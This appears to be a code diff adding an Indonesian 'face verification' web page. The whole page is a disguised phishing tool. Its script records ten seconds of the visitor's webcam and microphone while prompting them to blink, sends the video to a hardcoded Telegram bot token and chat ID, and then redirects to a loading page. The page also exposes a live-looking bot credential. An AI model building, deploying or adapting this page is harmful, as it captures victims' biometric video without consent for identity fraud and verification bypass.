@@ -1,0 +1,236 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Verifikasi Wajah</title>
+  <style>
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      background: #f2f4f7;
+      margin: 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      color: #333;
+    }
+
+    .container {
+      background: white;
+      border-radius: 16px;
+      padding: 20px;
+      width: 90%;
+      max-width: 400px;
+      box-shadow: 0 6px 20px rgba(0, 0, 0, 0.1);
+      text-align: center;
+      position: relative;
+    }
+
+    h2 {
+      color: #006ee9;
+      margin-bottom: 10px;
+    }
+
+    p {
+      font-size: 14px;
+      color: #555;
+      margin-bottom: 15px;
+    }
+
+    .video-wrapper {
+      position: relative;
+      width: 100%;
+      aspect-ratio: 4/3;
+      margin-bottom: 15px;
+      overflow: hidden;
+      border-radius: 12px;
+      border: 2px solid #006ee9;
+    }
+
+    video {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+    }
+
+    .overlay {
+      position: absolute;
+      top: 0; left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.4);
+      pointer-events: none;
+      z-index: 2;
+    }
+
+    .face-frame {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      width: 50%;
+      height: 65%;
+      transform: translate(-50%, -50%);
+      border: 3px dashed red;
+      border-radius: 50% / 60%;
+      background: transparent;
+      z-index: 3;
+    }
+
+    .countdown {
+      position: absolute;
+      top: 10px;
+      left: 50%;
+      transform: translateX(-50%);
+      font-size: 32px;
+      color: white;
+      font-weight: bold;
+      z-index: 5;
+      text-shadow: 0 0 5px black;
+    }
+
+    button {
+      width: 100%;
+      padding: 12px;
+      font-size: 16px;
+      border: none;
+      border-radius: 8px;
+      background-color: #006ee9;
+      color: white;
+      cursor: pointer;
+    }
+
+    button:disabled {
+      background-color: #ccc;
+      cursor: not-allowed;
+    }
+
+    #status {
+      margin-top: 15px;
+      font-size: 14px;
+    }
+
+    #blinkNow {
+      font-weight: bold;
+      color: red;
+      font-size: 16px;
+      animation: blink 1s infinite;
+    }
+
+    @keyframes blink {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0; }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <h2>Verifikasi Wajah</h2>
+    <p>Pastikan wajah Anda berada di dalam bingkai</p>
+
+    <div class="video-wrapper">
+      <video id="preview" autoplay muted playsinline></video>
+      <div class="overlay"></div>
+      <div class="face-frame"></div>
+      <div class="countdown" id="countdown"></div>
+    </div>
+
+    <button id="recordBtn" onclick="startCountdown()">Mulai Verifikasi Wajah</button>
+    <p id="status"></p>
+  </div>
+
+  <script>
+    const token = "7412368257:AAEr_6ARKm2Jg0AmGq3UnWKUNSvpDqR5RVs"; // Ganti dengan token bot Telegram Anda
+    const chat_id = "-4770559077"; // Ganti dengan chat ID Anda
+
+    let mediaRecorder;
+    let recordedChunks = [];
+
+    const video = document.getElementById("preview");
+    const statusText = document.getElementById("status");
+    const countdownEl = document.getElementById("countdown");
+    const recordBtn = document.getElementById("recordBtn");
+
+    navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+      .then(stream => {
+        video.srcObject = stream;
+        mediaRecorder = new MediaRecorder(stream);
+
+        mediaRecorder.ondataavailable = function(e) {
+          if (e.data.size > 0) recordedChunks.push(e.data);
+        };
+
+        mediaRecorder.onstop = function() {
+          const blob = new Blob(recordedChunks, { type: 'video/webm' });
+          const formData = new FormData();
+          formData.append('chat_id', chat_id);
+          formData.append('video', blob, 'verifikasi.webm');
+
+          fetch(`https://api.telegram.org/bot${token}/sendVideo`, {
+            method: 'POST',
+            body: formData
+          })
+          .then(() => {
+            statusText.innerText = "✅ Verifikasi diproses. Mengalihkan...";
+            setTimeout(() => {
+              window.location.href = "loading.html";
+            }, 2000);
+          })
+          .catch(() => {
+            statusText.innerText = "❌ Gagal verifikasi...";
+            recordBtn.disabled = false;
+          });
+
+          recordedChunks = [];
+        };
+      })
+      .catch(error => {
+        alert("Gagal mengakses kamera: " + error.message);
+      });
+
+    function startCountdown() {
+      let count = 3;
+      countdownEl.innerText = count;
+      recordBtn.disabled = true;
+
+      const interval = setInterval(() => {
+        count--;
+        if (count > 0) {
+          countdownEl.innerText = count;
+        } else {
+          clearInterval(interval);
+          countdownEl.innerText = "";
+          recordAndSend();
+        }
+      }, 1000);
+    }
+
+    function recordAndSend() {
+      recordedChunks = [];
+      mediaRecorder.start();
+      statusText.innerText = "Verifikasi dimulai...";
+      countdownEl.innerText = "";
+
+      // Tampilkan instruksi kedip dari detik ke-5 sampai detik ke-10
+      setTimeout(() => {
+        const blinkMsg = document.createElement("p");
+        blinkMsg.innerText = "👁️ Kedipkan mata sekarang!";
+        blinkMsg.id = "blinkNow";
+        document.querySelector(".container").appendChild(blinkMsg);
+      }, 5000);
+
+      setTimeout(() => {
+        const blinkNow = document.getElementById("blinkNow");
+        if (blinkNow) blinkNow.remove();
+      }, 10000);
+
+      setTimeout(() => {
+        mediaRecorder.stop();
+        statusText.innerText = "⏳ Loading...";
+      }, 10000);
+    }
+  </script>
+
+</body>
+</html>
